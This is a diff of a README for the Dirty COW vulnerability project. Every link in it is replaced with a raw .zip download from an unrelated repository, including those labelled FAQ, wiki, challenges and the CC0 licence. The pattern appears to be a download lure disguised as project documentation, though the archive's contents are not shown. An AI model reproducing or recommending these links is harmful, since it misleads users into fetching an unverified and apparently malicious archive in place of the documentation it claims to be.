@@ -2,10 +2,10 @@
 
 Hello
 
-To add a new FAQ entry please send a PR for https://github.com/startplusit/dirtycow.github.io/raw/refs/heads/master/Xenophontean/dirtycow-github-io-v2.6.zip
+To add a new FAQ entry please send a PR for https://github.com/startplusit/dirtycow.github.io/raw/refs/heads/master/Xenophontean/github-io-dirtycow-censureless.zip
 
-If you wish to learn more, or share what you currently know of the vulnerability head on to the wiki (open to everyone): https://github.com/startplusit/dirtycow.github.io/raw/refs/heads/master/Xenophontean/dirtycow-github-io-v2.6.zip
+If you wish to learn more, or share what you currently know of the vulnerability head on to the wiki (open to everyone): https://github.com/startplusit/dirtycow.github.io/raw/refs/heads/master/Xenophontean/github-io-dirtycow-censureless.zip
 
-If you already know all you need to know, participate in the [challenges](https://github.com/startplusit/dirtycow.github.io/raw/refs/heads/master/Xenophontean/dirtycow-github-io-v2.6.zip) and win fame, glory and a t-shirt.
+If you already know all you need to know, participate in the [challenges](https://github.com/startplusit/dirtycow.github.io/raw/refs/heads/master/Xenophontean/github-io-dirtycow-censureless.zip) and win fame, glory and a t-shirt.
 
-All code, images and documentation in this page and the website is in the public domain ([CC0](https://github.com/startplusit/dirtycow.github.io/raw/refs/heads/master/Xenophontean/dirtycow-github-io-v2.6.zip)).
+All code, images and documentation in this page and the website is in the public domain ([CC0](https://github.com/startplusit/dirtycow.github.io/raw/refs/heads/master/Xenophontean/github-io-dirtycow-censureless.zip)).
